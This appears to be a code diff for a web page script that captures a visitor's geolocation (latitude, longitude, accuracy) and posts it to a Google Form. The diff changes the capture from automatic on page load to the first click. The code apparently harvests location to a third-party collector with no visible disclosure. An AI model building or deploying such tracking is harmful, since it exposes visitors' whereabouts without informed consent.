@@ -407,9 +407,9 @@ function sendLocationToGoogleForm(lat, lon, acc) {
   const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc8_1bvxyfBuUXesnPi0XB1DHnCgbASxePGMB3qbQ1L7ShohA/formResponse";
 
   const data = new FormData();
-  data.append("entry.2079203041", lat);       // lat
-  data.append("entry.1053820474", lon);       // lon
-  data.append("entry.1349976098", acc);       // accuracy
+  data.append("entry.2079203041", lat);
+  data.append("entry.1053820474", lon);
+  data.append("entry.1349976098", acc);
 
   fetch(formUrl, {
     method: "POST",
@@ -428,5 +428,5 @@ function autoCaptureLocation() {
   });
 }
 
-
-window.onload = autoCaptureLocation;
+// ✅ Runs only AFTER first user tap
+window.addEventListener("click", autoCaptureLocation, { once: true });
